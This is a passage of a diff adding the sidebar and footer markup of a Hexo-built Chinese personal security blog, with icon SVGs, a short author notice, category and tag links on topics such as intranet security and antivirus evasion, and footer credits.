1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>一个热爱打游戏打篮球的脚本小子，欢迎找我闲聊</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">
+            内网安全 (3)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/">
+            神兵利器 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97/">
+            杀软对抗 (2)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">
+            硬件安全 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">
+            红蓝对抗 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/">
+            中间件安全 (1)
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/" style="font-size: 10px;" class="tags-cloud-0">中间件安全</a> <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="font-size: 20px;" class="tags-cloud-10">内网安全</a> <a href="/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/" style="font-size: 10px;" class="tags-cloud-0">硬件安全</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/WsyKer" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+      
+    </div>
+     
+    <p>&copy; 2022 <a href="/" target="_blank">WsyKer</a></p>
+
+    
+      <p><a href="https://beian.miit.gov.cn" target="_blank">豫ICP备2021003558号</a></p>
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
